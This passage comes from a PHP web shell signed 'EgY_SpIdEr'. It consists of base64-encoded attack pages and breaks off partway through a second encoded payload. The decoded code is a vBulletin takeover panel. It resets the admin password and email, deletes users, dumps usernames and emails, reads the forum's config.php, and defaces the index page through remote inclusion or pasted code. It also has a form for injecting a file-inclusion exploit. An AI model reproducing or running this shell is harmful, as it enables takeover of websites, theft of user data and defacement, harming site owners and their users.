NzZXQoJF9QT1NUWydkYiddKSAmJiAkYWN0PT0ibG9naW4iKQ0Kew0KJGhvc3QgPSAkX1BPU1RbJ2hvc3QnXTsNCiR1c2VyID0gJF9QT1NUWyd1c2VyJ107DQokcGFzcyA9ICRfUE9TVFsncGFzcyddOw0KJGRiID0gJF9QT1NUWydkYiddOw0KbXlzcWxfY29ubmVjdCgkaG9zdCwkdXNlciwkcGFzcykgb3IgZGllKCc8Zm9udCBjb2xvcj1yZWQ+Tm9wZSw8L2ZvbnQ+PGZvbnQgY29sb3I9eWVsbG93Pk5vIGNPbm5lY3Rpb24gd2l0aCB1c2VyPC9mb250PicpOw0KbXlzcWxfc2VsZWN0X2RiKCRkYikgb3IgZGllKCc8Zm9udCBjb2xvcj1yZWQ+Tm9wZSw8L2ZvbnQ+PGZvbnQgY29sb3I9eWVsbG93Pk5vIGNPbm5lY3Rpb24gd2l0aCBEQjwvZm9udD4nKTsNCmlmICgkcGFzcyA9PSAnJykNCnsNCiRucGFzcyA9ICdOVUxMJzsNCn0gZWxzZSB7DQokbnBhc3MgPSAkcGFzczsNCn0NCmVjaG8nPGZvbnQgc2l6ZT0zPllvdSBhcmUgY29ubmVjdGVkIHdpdGggdGhlIG15c3FsIHNlcnZlciBvZiA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRob3N0IC4gJzwvZm9udD4gYnkgdXNlciA6IDxmb250IGNvbG9yPXllbGxvdz4nIC4gJHVzZXIgLiAnPC9mb250PiAsIHBhc3MgOiA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRucGFzcyAuICc8L2ZvbnQ+IGFuZCBzZWxlY3RlZCBEQiB3aXRoIHRoZSBuYW1lIDxmb250IGNvbG9yPXllbGxvdz4nIC4gJGRiIC4gJzwvZm9udD48L2ZvbnQ+JzsNCj8+DQo8aHIgY29sb3I9IiMwMEZGMDAiIC8+DQo8Zm9ybSBuYW1lPSJjaGFuZ2VwYXNzIiBhY3Rpb249Ij9hY3Q9cHN3IiBtZXRob2Q9InBvc3QiPg0KPHRhYmxlIGJvcmRlcj0iMSIgYmdjb2xvcj0iIzAwMDAwMCIgYm9yZGVyY29sb3I9ImxpbWUiDQpib3JkZXJjb2xvcmRhcms9ImxpbWUiIGJvcmRlcmNvbG9ybGlnaHQ9ImxpbWUiPg0KPHRoPjo6Ojo6Q2hhbmdlIFVzZXIgUGFzc3dvcmQ6Ojo6OjwvdGg+PHRoPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IkNoYW5nZSIgdmFsdWU9IkNoYW5nZSIgLz48L3RoPg0KPHRyPjx0ZD5Vc2VyIDogPC90ZD48dGQ+PGlucHV0IG5hbWU9InZidXNlciIgdmFsdWU9ImFkbWluIiAvPjwvdGQ+PC90cj4NCjx0cj48dGQ+UGFzcyA6IDwvdGQ+PHRkPjxpbnB1dCBuYW1lPSJ2YnBhc3MiIHZhbHVlPSJlZ3kgc3BpZGVyIiAvPjwvdGQ+PC90cj4NCjwvdGFibGU+DQo8Pw0KZWNobyc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJob3N0IiB2YWx1ZT0iJyAuICRob3N0IC4gJyI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlciIgdmFsdWU9IicgLiAkdXNlciAuICciPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhc3MiIHZhbHVlPSInIC4gJHBhc3MgLiAnIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkYiIgdmFsdWU9IicgLiAkZGIgLiAnIj4nOw0KPz4NCjwvZm9ybT4NCjxociBjb2xvcj0iIzAwRkYwMCIgLz4NCjxmb3JtIG5hbWU9ImNoYW5nZXBhc3MiIGFjdGlvbj0iP2FjdD1tYWlsIiBtZXRob2Q9InBvc3QiPg0KPHRhYmxlIGJvcmRlcj0iMSIgYmdjb2xvcj0iIzAwMDAwMCIgYm9yZGVyY29sb3I9ImxpbWUiDQpib3JkZXJjb2xvcmRhcms9ImxpbWUiIGJvcmRlcmNvbG9ybGlnaHQ9ImxpbWUiPg0KPHRoPjo6Ojo6Q2hhbmdlIFVzZXIgRS1NQUlMOjo6Ojo8L3RoPjx0aD48aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJDaGFuZ2UiIHZhbHVlPSJDaGFuZ2UiIC8+PC90aD4NCjx0cj48dGQ+VXNlciA6IDwvdGQ+PHRkPjxpbnB1dCBuYW1lPSJ2YnVzZXIiIHZhbHVlPSJhZG1pbiIgLz48L3RkPjwvdHI+DQo8dHI+PHRkPk1BSUwgOiA8L3RkPjx0ZD48aW5wdXQgbmFtZT0idmJtYWlsIiB2YWx1ZT0iZWd5X3NwaWRlckBob3RtYWlsLmNvbSIgLz48L3RkPjwvdHI+DQo8L3RhYmxlPg0KPD8NCmVjaG8nPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iaG9zdCIgdmFsdWU9IicgLiAkaG9zdCAuICciPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InVzZXIiIHZhbHVlPSInIC4gJHVzZXIgLiAnIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwYXNzIiB2YWx1ZT0iJyAuICRwYXNzIC4gJyI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZGIiIHZhbHVlPSInIC4gJGRiIC4gJyI+JzsNCj8+DQo8L2Zvcm0+DQo8aHIgY29sb3I9IiMwMEZGMDAiIC8+DQo8Zm9ybSBuYW1lPSJjaGFuZ2VwYXNzIiBhY3Rpb249Ij9hY3Q9ZGVsIiBtZXRob2Q9InBvc3QiPg0KPHRhYmxlIGJvcmRlcj0iMSIgYmdjb2xvcj0iIzAwMDAwMCIgYm9yZGVyY29sb3I9ImxpbWUiDQpib3JkZXJjb2xvcmRhcms9ImxpbWUiIGJvcmRlcmNvbG9ybGlnaHQ9ImxpbWUiPg0KPHRoPjo6Ojo6RGVsZXRlIGEgdXNlcjo6Ojo6PC90aD48dGg+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iQ2hhbmdlIiB2YWx1ZT0iQ2hhbmdlIiAvPjwvdGg+DQo8dHI+PHRkPlVzZXIgOiA8L3RkPjx0ZD48aW5wdXQgbmFtZT0idmJ1c2VyIiB2YWx1ZT0iYWRtaW4iIC8+PC90ZD48L3RyPg0KPC90YWJsZT4NCjw/DQplY2hvJzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Imhvc3QiIHZhbHVlPSInIC4gJGhvc3QgLiAnIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ1c2VyIiB2YWx1ZT0iJyAuICR1c2VyIC4gJyI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGFzcyIgdmFsdWU9IicgLiAkcGFzcyAuICciPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRiIiB2YWx1ZT0iJyAuICRkYiAuICciPic7DQo/Pg0KPC9mb3JtPg0KPGhyIGNvbG9yPSIjMDBGRjAwIiAvPg0KPGZvcm0gbmFtZT0iY2hhbmdlcGFzcyIgYWN0aW9uPSI/YWN0PWluYyIgbWV0aG9kPSJwb3N0Ij4NCjx0YWJsZSBib3JkZXI9IjEiIGJnY29sb3I9IiMwMDAwMDAiIGJvcmRlcmNvbG9yPSJsaW1lIg0KYm9yZGVyY29sb3JkYXJrPSJsaW1lIiBib3JkZXJjb2xvcmxpZ2h0PSJsaW1lIj4NCjx0aD46Ojo6OkNoYW5nZSBJbmRleCBieSBJbmNsdXNpb24oTm90IFBMKEVnWSBTcElkRXIpKTo6Ojo6PC90aD48dGg+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iQ2hhbmdlIiB2YWx1ZT0iQ2hhbmdlIiAvPjwvdGg+DQo8dHI+PHRkPkluZGV4IExpbmsgOiA8L3RkPjx0ZD48aW5wdXQgbmFtZT0ibGluayIgdmFsdWU9Imh0dHA6Ly93d3cuZWd5c3BpZGVyLmV1L2hhY2tlZC5odG1sIiAvPjwvdGQ+PC90cj4NCjwvdGFibGU+DQo8Pw0KZWNobyc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJob3N0IiB2YWx1ZT0iJyAuICRob3N0IC4gJyI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlciIgdmFsdWU9IicgLiAkdXNlciAuICciPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhc3MiIHZhbHVlPSInIC4gJHBhc3MgLiAnIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkYiIgdmFsdWU9IicgLiAkZGIgLiAnIj4nOw0KPz4NCjwvZm9ybT4NCjxociBjb2xvcj0iIzAwRkYwMCIgLz4NCjxmb3JtIG5hbWU9ImNoYW5nZXBhc3MiIGFjdGlvbj0iP2FjdD1jb2RlIiBtZXRob2Q9InBvc3QiPg0KPHRhYmxlIGJvcmRlcj0iMSIgYmdjb2xvcj0iIzAwMDAwMCIgYm9yZGVyY29sb3I9ImxpbWUiDQpib3JkZXJjb2xvcmRhcms9ImxpbWUiIGJvcmRlcmNvbG9ybGlnaHQ9ImxpbWUiPg0KPHRoPjo6Ojo6Q2hhbmdlIEluZGV4IGJ5IENvZGUoQWxsIEVkaXRpb24pOjo6Ojo8L3RoPjx0aD48aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJDaGFuZ2UiIHZhbHVlPSJDaGFuZ2UiIC8+PC90aD4NCjx0cj48dGQ+SW5kZXggQ29kZSA6IDwvdGQ+PHRkPjx0ZXh0YXJlYSBuYW1lPSJjb2RlIiBjb2xzPTYwIHJvd3M9MjA+PC90ZXh0YXJlYT48L3RkPjwvdHI+DQo8L3RhYmxlPg0KPD8NCmVjaG8nPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iaG9zdCIgdmFsdWU9IicgLiAkaG9zdCAuICciPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InVzZXIiIHZhbHVlPSInIC4gJHVzZXIgLiAnIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwYXNzIiB2YWx1ZT0iJyAuICRwYXNzIC4gJyI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZGIiIHZhbHVlPSInIC4gJGRiIC4gJyI+JzsNCj8+DQo8L2Zvcm0+DQo8aHIgY29sb3I9IiMwMEZGMDAiIC8+DQo8Zm9ybSBuYW1lPSJjaGFuZ2VwYXNzIiBhY3Rpb249Ij9hY3Q9c2hlbGwiIG1ldGhvZD0icG9zdCI+DQo8dGFibGUgYm9yZGVyPSIxIiBiZ2NvbG9yPSIjMDAwMDAwIiBib3JkZXJjb2xvcj0ibGltZSINCmJvcmRlcmNvbG9yZGFyaz0ibGltZSIgYm9yZGVyY29sb3JsaWdodD0ibGltZSI+DQo8dGg+Ojo6OjpJbmplY3QgRmlsZUluY2x1c2lvbiBFeHBsb2l0KE5PVCBQTChBTC1NQVNTWUEpKTo6Ojo6PC90aD48dGg+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iQ2hhbmdlIiB2YWx1ZT0iQ2hhbmdlIiAvPjwvdGg+DQo8dHI+PHRkPlZhcmlhYmxlIDogPC90ZD48dGQ+PGlucHV0IG5hbWU9InZhciIgdmFsdWU9InNoZWxsIiAvPjwvdGQ+PC90cj4NCjwvdGFibGU+DQo8Pw0KZWNobyc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJob3N0IiB2YWx1ZT0iJyAuICRob3N0IC4gJyI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlciIgdmFsdWU9IicgLiAkdXNlciAuICciPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhc3MiIHZhbHVlPSInIC4gJHBhc3MgLiAnIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkYiIgdmFsdWU9IicgLiAkZGIgLiAnIj4nOw0KPz4NCjwvZm9ybT4NCjw/DQp9DQppZiAoJGFjdCA9PSAnJyl7DQo/Pg0KPGZvcm0gbmFtZT0ibXlmb3JtIiBhY3Rpb249Ij9hY3Q9bG9naW4iIG1ldGhvZD0icG9zdCI+DQo8dGFibGUgYm9yZGVyPSIxIiBiZ2NvbG9yPSIjMDAwMDAwIiBib3JkZXJjb2xvcj0ibGltZSINCmJvcmRlcmNvbG9yZGFyaz0ibGltZSIgYm9yZGVyY29sb3JsaWdodD0ibGltZSI+DQo8dGg+Ojo6OjpEQVRBQkFTRSBDT05GSUc6Ojo6OjwvdGg+PHRoPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IkNvbm5lY3QiIHZhbHVlPSJDb25uZWN0IiAvPjwvdGg+PHRyPjx0ZD5Ib3N0IDogPC90ZD48dGQ+PGlucHV0IG5hbWU9Imhvc3QiIHZhbHVlPSJsb2NhbGhvc3QiIC8+PC90ZD48L3RyPg0KPHRyPjx0ZD5Vc2VyIDogPC90ZD48dGQ+PGlucHV0IG5hbWU9InVzZXIiIHZhbHVlPSJyb290IiAvPjwvdGQ+PC90cj4NCjx0cj48dGQ+UGFzcyA6IDwvdGQ+PHRkPjxpbnB1dCBuYW1lPSJwYXNzIiB2YWx1ZT0iIiAvPjwvdGQ+PC90cj4NCjx0cj48dGQ+TmFtZSA6IDwvdGQ+PHRkPjxpbnB1dCBuYW1lPSJkYiIgdmFsdWU9InZiIiAvPjwvdGQ+PC90cj4NCjwvdGFibGU+DQo8L2Zvcm0+DQoNCjw/DQp9DQppZiAoJGFjdCA9PSAnbHN0JyAmJiBpc3NldCgkX1BPU1RbJ3VzZXInXSkgJiYgaXNzZXQoJF9QT1NUWydwYXNzJ10pICYmIGlzc2V0KCRfUE9TVFsnaG9zdCddKSAmJiBpc3NldCgkX1BPU1RbJ2RiJ10pKQ0Kew0KJGhvc3QgPSAkX1BPU1RbJ2hvc3QnXTsNCiR1c2VyID0gJF9QT1NUWyd1c2VyJ107DQokcGFzcyA9ICRfUE9TVFsncGFzcyddOw0KJGRiID0gJF9QT1NUWydkYiddOw0KbXlzcWxfY29ubmVjdCgkaG9zdCwkdXNlciwkcGFzcykgb3IgZGllKCc8Zm9udCBjb2xvcj1yZWQ+Tm9wZSw8L2ZvbnQ+PGZvbnQgY29sb3I9eWVsbG93Pk5vIGNPbm5lY3Rpb24gd2l0aCB1c2VyPC9mb250PicpOw0KbXlzcWxfc2VsZWN0X2RiKCRkYikgb3IgZGllKCc8Zm9udCBjb2xvcj1yZWQ+Tm9wZSw8L2ZvbnQ+PGZvbnQgY29sb3I9eWVsbG93Pk5vIGNPbm5lY3Rpb24gd2l0aCBEQjwvZm9udD4nKTsNCmlmICgkcGFzcyA9PSAnJykNCnsNCiRucGFzcyA9ICdOVUxMJzsNCn0gZWxzZSB7DQokbnBhc3MgPSAkcGFzczsNCn0NCmVjaG8nPGZvbnQgc2l6ZT0zPllvdSBhcmUgY29ubmVjdGVkIHdpdGggdGhlIG15c3FsIHNlcnZlciBvZiA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRob3N0IC4gJzwvZm9udD4gYnkgdXNlciA6IDxmb250IGNvbG9yPXllbGxvdz4nIC4gJHVzZXIgLiAnPC9mb250PiAsIHBhc3MgOiA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRucGFzcyAuICc8L2ZvbnQ+IGFuZCBzZWxlY3RlZCBEQiB3aXRoIHRoZSBuYW1lIDxmb250IGNvbG9yPXllbGxvdz4nIC4gJGRiIC4gJzwvZm9udD48L2ZvbnQ+JzsNCj8+DQo8aHIgY29sb3I9IiMwMEZGMDAiIC8+DQo8Pw0KJHJlID0gbXlzcWxfcXVlcnkoJ3NlbGVjdCAqIGZyb20gdXNlcicpOw0KZWNobyc8dGFibGUgYm9yZGVyPSIxIiBiZ2NvbG9yPSIjMDAwMDAwIiBib3JkZXJjb2xvcj0ibGltZSINCmJvcmRlcmNvbG9yZGFyaz0ibGltZSIgYm9yZGVyY29sb3JsaWdodD0ibGltZSI+PHRoPklEPC90aD48dGg+VVNFUk5BTUU8L3RoPjx0aD5FTUFJTDwvdGg+JzsNCndoaWxlICgkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlKSkNCnsNCmVjaG8nPHRyPjx0ZD4nIC4gJHJvd1sndXNlcmlkJ10gLiAnPC90ZD48dGQ+JyAuICRyb3dbJ3VzZXJuYW1lJ10gLiAnPC90ZD48dGQ+JyAuICRyb3dbJ2VtYWlsJ10gLiAnPC90ZD48L3RyPic7DQp9DQplY2hvJzwvdGFibGU+JzsNCj8+DQo8dGFibGUgYm9yZGVyPSIxIiBiZ2NvbG9yPSIjMDAwMDAwIiBib3JkZXJjb2xvcj0ibGltZSINCmJvcmRlcmNvbG9yZGFyaz0ibGltZSIgYm9yZGVyY29sb3JsaWdodD0ibGltZSI+PHRoPjw/DQokY291bnQgPSBteXNxbF9udW1fcm93cygkcmUpOw0KZWNobyAnTnVtYmVyIG9mIHVzZXJzIHJlZ2lzdGVyZWQgaXMgOiBbICcgLiAkY291bnQgLiAnIF0nOw0KID8+PC90aD48L3RhYmxlPg0KPD8NCn0NCmlmICgkYWN0ID09ICd1c2Vycycpew0KPz4NCiA8Zm9ybSBuYW1lPSJteWZvcm0iIGFjdGlvbj0iP2FjdD1sc3QiIG1ldGhvZD0icG9zdCI+DQo8dGFibGUgYm9yZGVyPSIxIiBiZ2NvbG9yPSIjMDAwMDAwIiBib3JkZXJjb2xvcj0ibGltZSINCmJvcmRlcmNvbG9yZGFyaz0ibGltZSIgYm9yZGVyY29sb3JsaWdodD0ibGltZSI+DQo8dGg+Ojo6OjpEQVRBQkFTRSBDT05GSUc6Ojo6OjwvdGg+PHRoPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IkNvbm5lY3QiIHZhbHVlPSJDb25uZWN0IiAvPjwvdGg+PHRyPjx0ZD5Ib3N0IDogPC90ZD48dGQ+PGlucHV0IG5hbWU9Imhvc3QiIHZhbHVlPSJsb2NhbGhvc3QiIC8+PC90ZD48L3RyPg0KPHRyPjx0ZD5Vc2VyIDogPC90ZD48dGQ+PGlucHV0IG5hbWU9InVzZXIiIHZhbHVlPSJyb290IiAvPjwvdGQ+PC90cj4NCjx0cj48dGQ+UGFzcyA6IDwvdGQ+PHRkPjxpbnB1dCBuYW1lPSJwYXNzIiB2YWx1ZT0iIiAvPjwvdGQ+PC90cj4NCjx0cj48dGQ+TmFtZSA6IDwvdGQ+PHRkPjxpbnB1dCBuYW1lPSJkYiIgdmFsdWU9InZiIiAvPjwvdGQ+PC90cj4NCjwvdGFibGU+DQo8L2Zvcm0+DQo8Pw0KfQ0KaWYgKCRhY3Q9PSdjb25maWcnKQ0Kew0KPz4NCjxmb3JtIG5hbWU9Im15Zm9ybSIgYWN0aW9uPSI/YWN0PXJlY29uZmlnIiBtZXRob2Q9InBvc3QiPg0KPHRhYmxlIGJvcmRlcj0iMSIgYmdjb2xvcj0iIzAwMDAwMCIgYm9yZGVyY29sb3I9ImxpbWUiDQpib3JkZXJjb2xvcmRhcms9ImxpbWUiIGJvcmRlcmNvbG9ybGlnaHQ9ImxpbWUiPg0KPHRoPjo6Ojo6Q09ORklHIFBBVEg6Ojo6OjwvdGg+PHRoPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IkNvbm5lY3QiIHZhbHVlPSJSZWFkIiAvPjwvdGg+DQo8dHI+PHRkPlBBVEggOiA8L3RkPjx0ZD48aW5wdXQgbmFtZT0icGF0aCIgdmFsdWU9Ii9ob21lL2hhY2tlZC9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwIiAvPjwvdGQ+PC90cj48L3RhYmxlPjwvZm9ybT4NCjw/DQp9DQppZiAoJGFjdD09J2luZGV4JykNCnsNCi8vIEluZGV4IEVkaXRvcjxIVE1MIEVkaXRvcj4NCj8+DQo8c2NyaXB0IGxhbmd1YWdlPSdqYXZhc2NyaXB0Jz4NCmZ1bmN0aW9uIGxpbmsoKXsNCnZhciBYID0gcHJvbXB0KCJFbnRlclRleHQiLCIiKQ0KaWYgKFg9PSIiIHwgWD09bnVsbCApIHsNCnJldHVybjsNCn0NCnZhciB5ID0gcHJvbXB0KCJFbnRlcmxpbmsiLCIiKQ0KaWYgKHk9PSIiIHwgeT09bnVsbCApIHsNCnJldHVybjsNCn0NCg0KaW5kZXhmb3JtLmluZGV4LnZhbHVlPWluZGV4Zm9ybS5pbmRleC52YWx1ZSArICI8YSBocmVmPSIgKyB5ICsiPiIrWCsiPC9hPiI7DQoNCn0NCg0KZnVuY3Rpb24gcmlnaHQoKXsNCnZhciBYID0gcHJvbXB0KCJFbnRlciBUZXh0IiwiIikNCmlmIChYPT0iIiB8IFg9PW51bGwgKSB7DQpyZXR1cm47DQp9DQppbmRleGZvcm0uaW5kZXgudmFsdWU9aW5kZXhmb3JtLmluZGV4LnZhbHVlICsgIjxwIGFsaWduPSdyaWdodCc+IitYKyI8L3A+IjsNCg0KfQ0KZnVuY3Rpb24gbGVmdCgpew0KdmFyIFggPSBwcm9tcHQoIkVudGVyIFRleHQiLCIiKQ0KaWYgKFg9PSIiIHwgWD09bnVsbCApIHsNCnJldHVybjsNCn0NCmluZGV4Zm9ybS5pbmRleC52YWx1ZT1pbmRleGZvcm0uaW5kZXgudmFsdWUgKyAiPHAgYWxpZ249J2xlZnQnPiIrWCsiPC9wPiI7DQoNCn0NCmZ1bmN0aW9uIGNlbnRlcigpew0KdmFyIFggPSBwcm9tcHQoIkVudGVyIFRleHQiLCIiKQ0KaWYgKFg9PSIiIHwgWD09bnVsbCApIHsNCnJldHVybjsNCn0NCmluZGV4Zm9ybS5pbmRleC52YWx1ZT1pbmRleGZvcm0uaW5kZXgudmFsdWUgKyAiPGNlbnRlcj4iK1grIjwvY2VudGVyPiI7DQoNCn0NCmZ1bmN0aW9uIGNvbG91cigpew0KdmFyIFggPSBwcm9tcHQoIkVudGVyVGV4dCIsIiIpDQppZiAoWD09IiIgfCBYPT1udWxsICkgew0KcmV0dXJuOw0KfQ0KdmFyIHkgPSBwcm9tcHQoIkVudGVyQ29sb3VyIiwiIikNCmlmICh5PT0iIiB8IHk9PW51bGwgKSB7DQpyZXR1cm47DQp9DQoNCmluZGV4Zm9ybS5pbmRleC52YWx1ZT1pbmRleGZvcm0uaW5kZXgudmFsdWUgKyAiPGZvbnQgY29sb3I9IiArIHkgKyI+IitYKyI8L2ZvbnQ+IjsNCg0KfQ0KZnVuY3Rpb24gYigpew0KdmFyIFggPSBwcm9tcHQoIkVudGVyIFRleHQiLCIiKQ0KaWYgKFg9PSIiIHwgWD09bnVsbCApIHsNCnJldHVybjsNCn0NCmluZGV4Zm9ybS5pbmRleC52YWx1ZT1pbmRleGZvcm0uaW5kZXgudmFsdWUgKyAiPEI+IitYKyI8L0I+IjsNCg0KfQ0KZnVuY3Rpb24gdSgpew0KdmFyIFggPSBwcm9tcHQoIkVudGVyIFRleHQiLCIiKQ0KaWYgKFg9PSIiIHwgWD09bnVsbCApIHsNCnJldHVybjsNCn0NCmluZGV4Zm9ybS5pbmRleC52YWx1ZT1pbmRleGZvcm0uaW5kZXgudmFsdWUgKyAiPFU+IitYKyI8L1U+IjsNCg0KfQ0KZnVuY3Rpb24gaSgpew0KdmFyIFggPSBwcm9tcHQoIkVudGVyIFRleHQiLCIiKQ0KaWYgKFg9PSIiIHwgWD09bnVsbCApIHsNCnJldHVybjsNCn0NCmluZGV4Zm9ybS5pbmRleC52YWx1ZT1pbmRleGZvcm0uaW5kZXgudmFsdWUgKyAiPEk+IitYKyI8L0k+IjsNCg0KfQ0KZnVuY3Rpb24gbWFyKCl7DQp2YXIgWCA9IHByb21wdCgiRW50ZXIgVGV4dCIsIiIpDQppZiAoWD09IiIgfCBYPT1udWxsICkgew0KcmV0dXJuOw0KfQ0KaW5kZXhmb3JtLmluZGV4LnZhbHVlPWluZGV4Zm9ybS5pbmRleC52YWx1ZSArICI8bWFycXVlZT4iK1grIjwvbWFycXVlZT4iOw0KDQp9DQpmdW5jdGlvbiBpbWcoKXsNCnZhciBYID0gcHJvbXB0KCJFbnRlciBsaW5rIiwiIikNCmlmIChYPT0iIiB8IFg9PW51bGwgKSB7DQpyZXR1cm47DQp9DQppbmRleGZvcm0uaW5kZXgudmFsdWU9aW5kZXhmb3JtLmluZGV4LnZhbHVlICsgIjxpbWcgc3JjPSciK1grIic+PC9pbWc+IjsNCg0KfQ0KZnVuY3Rpb24gYnIoKXsNCmluZGV4Zm9ybS5pbmRleC52YWx1ZT1pbmRleGZvcm0uaW5kZXgudmFsdWUgKyAiPGJyPiI7DQoNCn0NCjwvc2NyaXB0Pg0KPHRhYmxlIGJvcmRlcj0iMSIgYm9yZGVyY29sb3I9IiMwMDgwMDAiIGJvcmRlcmNvbG9yZGFyaz0iIzAwODAwMCINCmJvcmRlcmNvbG9ybGlnaHQ9IiMwMDgwMDAiPjx0aD48YSBvbmNsaWNrPSdyZXR1cm4gY2VudGVyKCknPkNlbnRlcjwvYT4gfHx8IDxhIG9uY2xpY2s9J3JldHVybiBsZWZ0KCknPkxlZnQ8L2E+IHx8fCA8YSBvbmNsaWNrPSdyZXR1cm4gcmlnaHQoKSc+cmlnaHQ8L2E+IHx8fCA8YSBvbmNsaWNrPSdyZXR1cm4gYigpJz5Cb2xkPC9hPiB8fHwgPGEgb25jbGljaz0ncmV0dXJuIHUoKSc+VW5kZXJMaW5lPC9hPiB8fHwgPGEgb25jbGljaz0ncmV0dXJuIGkoKSc+SXRhbGljPC9hPiB8fHwgPGEgb25jbGljaz0ncmV0dXJuIGJyKCknPk5ld0xpbmU8L2E+IHx8fCA8YSBvbmNsaWNrPSdyZXR1cm4gY29sb3VyKCknPkNvbG91cjwvYT4gfHx8IDxhIG9uY2xpY2s9J3JldHVybiBtYXIoKSc+TWFycXVlZSB8fHwgPGEgb25jbGljaz0ncmV0dXJuIGltZygpJz5QaWN0dXJlPC9hPiB8fHwgPGEgb25jbGljaz0ncmV0dXJuIGxpbmsoKSc+TGluazwvYT48L2E+PC90aD48dHI+PFREPg0KPGNlbnRlcj48Zm9ybSBuYW1lPSJpbmRleGZvcm0iIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPjx0ZXh0YXJlYSBuYW1lPSdpbmRleCcgcm93cz0nMTQnIGNvbHM9Jzg2Jz48L3RleHRhcmVhPjwvcD4NCjwvZm9ybT48L2Zvcm0+PC9jZW50ZXI+DQo8L1REPjwvdHI+PHRyPjx0ZD5Db3B5IFRoZSBDb2RlIGFmdGVyIEZpbmlzaGluZyB5b3VyIGluZGV4PC90ZD48L3RyPjwvdGFibGU+DQo8Pw0KfQ0KPz4NCjxociBjb2xvcj0iIzAwRkYwMCIgLz4NCjx0YWJsZSBib3JkZXI9IjEiIGJnY29sb3I9IiMwMDAwMDAiIGJvcmRlcmNvbG9yPSJsaW1lIg0KYm9yZGVyY29sb3JkYXJrPSJsaW1lIiBib3JkZXJjb2xvcmxpZ2h0PSJsaW1lIj48dHI+PHRkPjxhIGhyZWY9Ij8iPk1haW4gU2hlbGw8L2E+PC90ZD48dGQ+PGEgaHJlZj0iP2FjdD11c2VycyI+TGlzdCBVc2VyczwvYT48L3RkPjx0ZD48YSBocmVmPSI/YWN0PWluZGV4Ij5JbmRleCBNYWtlcjwvYT48L3RkPjx0ZD48YSBocmVmPSI/YWN0PWNvbmZpZyI+UmVhZENvbmZpZzwvYT48L3RkPjwvdHI+PC90YWJsZT4NCjxwIGFsaWduPSJjZW50ZXIiPnd3dy5lZ3lzcGlkZXIuZXU8L3A+DQo8RElWIGlkPSJuIiBhbGlnbj0iY2VudGVyIj4NCiAgPFRBQkxFIGJvcmRlckNvbG9yPSIjMTExMTExIiBjZWxsU3BhY2luZz0iMCIgY2VsbFBhZGRpbmc9IjAiIHdpZHRoPSIxMDAlIiBib3JkZXI9IjEiPg0KICAgIDxUQk9EWT4NCiAgICAgIDxUUj4NCiAgICAgICAgPFREIHdpZHRoPSIxMDAlIj48cCBhbGlnbj0iY2VudGVyIj48U1RST05HPm8tLS1bIEVnWV9TcElkRXIgfCB8IDxBIGVneV9zcGlkZXJAaG90bWFpbC5jb20+ZWd5X3NwaWRlckBob3RtYWlsLmNvbTwvQT4gICBdLS0tbzwvU1RST05HPjwvcD48L1REPg0KICAgICAgPC9UUj4NCiAgICA8L1RCT0RZPg0KICA8L1RBQkxFPg0KPC9ESVY+DQo8L2NlbnRlcj4gDQogPC9ib2R5Pg0KPC9odG1sPg=";

$egy_cp="PD9waHAgDQplY2hvICI8aHRtbD4iOyANCmVjaG8gIjx0aXRsZT5FZ1lfU3BJZEVyIFNoRWxMIDwvdGl0bGU+PFNUWUxFPg0KDQpCT0RZDQogew0KICAgICAgICBTQ1JPTExCQVItRkFDRS1DT0xPUjogIzAwMDAwMDsgU0NST0xMQkFSLUhJR0hMSUdIVC1DT0xPUjogIzAwMDAwMDsgU0NST0xMQkFSLVNIQURPVy1DT0xPUjogIzAwMDAwMDsgQ09MT1I6ICM2NjY2NjY7IFNDUk9MTEJBUi0zRExJR0hULUNPTE9SOiAjNzI2NDU2OyBTQ1JPTExCQVItQVJST1ctQ09MT1I6ICM3MjY0NTY7IFNDUk9MTEJBUi1UUkFDSy1DT0xPUjogIzI5MjkyOTsgRk9OVC1GQU1JTFk6IFZlcmRhbmE7IFNDUk9MTEJBUi1EQVJLU0hBRE9XLUNPTE9SOiAjNzI2NDU2DQp9DQoNCi50ZDEgew0KQk9SREVSOiAxOw0KZm9udDogN3B0IHRhaG9tY